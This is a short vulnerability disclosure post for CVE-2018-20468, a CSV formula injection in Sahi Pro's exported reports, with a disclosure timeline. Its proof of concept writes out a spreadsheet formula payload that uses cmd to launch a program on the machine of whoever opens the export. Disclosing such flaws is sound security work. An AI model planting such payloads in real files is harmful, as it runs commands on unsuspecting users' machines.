# CVE-2018-20468 – Sahi pro ( <= 8.x ) CSV Injection

June 11, 2019
[goutham madhwaraj](https://barriersec.com/author/goutham/ "Posts by goutham madhwaraj")

This is one of the low risk bug which was found in **Sahi Pro.** Reports web interface allows a user to export the executed automation scripts/suite in excel format. It is possible to inject the excel formula which results in command execution on the victim who exports it .

**Proof of concept :**

excel formulas can be injected inside the sahi script as shown previously with stored XSS inside a testcase API as follows.

**script used :**

**var $tc1 = \_testcase(“TC-1″,”=SUM(1+1)\*cmd|’ /C calc’!A0”).start();**

**\_log(“testing csv injection”);**

**$tc1.end();**

Execute the following sahi script and take export of the report as follows :

![](https://barriersec.com/wp-content/uploads/csv_injection_7.png)

**Fig : executed sahi script with formula injection.**

![](https://barriersec.com/wp-content/uploads/csv_injection_11.png)

**Fig : victim opens the file and clicks yes on warning and the code                                         executes on victim machine .**

**Disclosure timeline :**

Notified on : **8 / December / 2018**

Affected versions : all versions of **sahi pro ( <= 8.x ) (web application automation )**

**vendor website** :  <https://sahipro.com/>
